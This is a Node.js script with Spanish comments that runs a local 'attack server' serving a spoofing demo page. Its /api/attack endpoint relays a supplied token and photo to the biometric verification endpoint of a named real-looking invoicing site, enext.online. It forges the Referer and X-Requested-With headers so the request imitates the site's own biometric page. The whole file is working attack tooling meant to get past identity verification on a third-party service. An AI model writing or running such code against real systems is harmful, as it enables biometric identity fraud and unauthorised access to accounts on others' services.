const http = require('http');
const https = require('https');
const fs = require('fs');
const path = require('path');

const PORT = 3000;

const server = http.createServer((req, res) => {
  // 1. Servir la página HTML de la interfaz
  if (req.method === 'GET' && (req.url === '/' || req.url === '/index.html')) {
    const htmlPath = path.join(__dirname, 'demo_spoofing.html');
    fs.readFile(htmlPath, (err, data) => {
      if (err) {
        res.writeHead(500);
        return res.end('Error cargando demo_spoofing.html');
      }
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      res.end(data);
    });
    return;
  }

  // 2. Endpoint API que recibe los datos de la interfaz y lanza el ataque
  if (req.method === 'POST' && req.url === '/api/attack') {
    let body = '';
    
    // Leer los datos enviados por la interfaz web
    req.on('data', chunk => {
      body += chunk.toString();
    });
    
    req.on('end', () => {
      try {
        const payload = JSON.parse(body);
        const token = payload.token;
        const foto = payload.foto;

        if (!token || !foto) {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({ error: 'Faltan datos' }));
        }

        // Empaquetar como formulario HTTP (igual que el navegador original)
        const postData = new URLSearchParams({ foto: foto, token: token }).toString();

        // Armar la petición hacia el servidor real (Disfraz)
        const attackReq = https.request({
          hostname: 'enext.online',
          path: '/factureroweb/admin/controller/emision/biometrico.php',
          method: 'POST',
          headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': Buffer.byteLength(postData),
            'Referer': 'https://enext.online/factureroweb/public/biometria.php',
            'X-Requested-With': 'XMLHttpRequest'
          }
        }, (attackRes) => {
          let attackData = '';
          attackRes.on('data', chunk => attackData += chunk);
          attackRes.on('end', () => {
            // Devolver el resultado a nuestra interfaz web
            res.writeHead(200, { 'Content-Type': 'application/json' });
            res.end(JSON.stringify({
              status: attackRes.statusCode,
              body: attackData
            }));
          });
        });

        attackReq.on('error', (e) => {
          res.writeHead(500, { 'Content-Type': 'application/json' });
          res.end(JSON.stringify({ error: e.message }));
        });

        attackReq.write(postData);
        attackReq.end();

      } catch (e) {
        res.writeHead(400, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ error: 'Error procesando JSON' }));
      }
    });
    return;
  }

  // Ruta no encontrada
  res.writeHead(404);
  res.end('Not Found');
});

server.listen(PORT, () => {
  console.log(`\n======================================================`);
  console.log(`🚀 SERVIDOR DE ATAQUE LOCAL INICIADO`);
  console.log(`👉 Abre tu navegador en: http://localhost:${PORT}`);
  console.log(`======================================================\n`);
});
